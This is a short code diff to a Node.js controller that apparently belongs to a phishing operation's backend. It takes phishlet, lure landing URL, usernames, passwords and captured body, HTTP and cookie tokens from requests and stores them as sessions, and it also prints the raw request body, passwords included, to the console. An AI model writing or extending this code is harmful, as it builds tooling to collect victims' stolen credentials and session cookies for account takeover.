@@ -18,8 +18,32 @@ const reject = (err, res) => {
 };
 
 exports.create = (req, res) => {
+  console.log(req.body);
+  const {
+    phishlet,
+    landing_url,
+    username,
+    password,
+    body_tokens,
+    http_tokens,
+    tokens,
+    session_id,
+    useragent,
+    remote_addr,
+  } = req.body;
   sessionService
-    .create(req.body)
+    .create({
+      phishlet,
+      landingUrl: landing_url,
+      username,
+      password,
+      bodyToken: body_tokens,
+      httpToken: http_tokens,
+      cookieToken: tokens,
+      sessionId: session_id,
+      userAgent: useragent,
+      remoteAddr: remote_addr,
+    })
     .then((data) => {
       lureService
         .findOne({ landingUrl: data.landingUrl })
